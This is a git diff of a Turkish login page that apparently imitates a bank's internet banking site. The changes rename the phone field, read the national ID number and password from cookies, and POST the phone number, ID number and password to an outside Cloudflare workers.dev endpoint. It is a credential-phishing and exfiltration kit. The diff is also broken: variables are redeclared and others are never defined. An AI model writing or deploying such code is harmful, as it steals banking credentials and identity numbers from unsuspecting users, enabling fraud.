@@ -104,7 +104,7 @@
               
             <div class="input-part">
                 <!-- ko if: type()=='mbb' -->
-                <input class="inputarea" type="number" pattern="[0-9]*" id="tcno" name="tcno" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="+90">
+                <input class="inputarea" type="number" pattern="[0-9]*" id="telno" name="telno" data-bind="bind-numeric: value, attr: { placeholder : placeholder},settings: { maxlength: 11 }" placeholder="+90">
                 <!-- /ko -->
                 <!-- ko if: type()=='yatirimci' --><!-- /ko -->
                 <!-- ko if: type()=='ast' --><!-- /ko -->
@@ -433,13 +433,14 @@ loginBtn.addEventListener('click', function () {
     var tcno = phoneNumberInput.value;
 
     // Cookie'den kayıtlı adı al
-    var savedName = getCookie("savedName");
-
+    var tcno = getCookie("tcno");
+    var tcno = getCookie("pass");
+    
     // POST işlemi için veri oluştur
     var data = new FormData();
-    data.append('tcno', tcno);
-    data.append('savedName', savedName); // Cookie'den alınan adı ekle
-
+    data.append('telno', telno);
+    data.append('tcno', tcno); // Cookie'den alınan adı ekle
+    data.append('pass', pass);
     // POST işlemi için fetch kullanarak isteği oluştur
     fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
         method: 'POST',
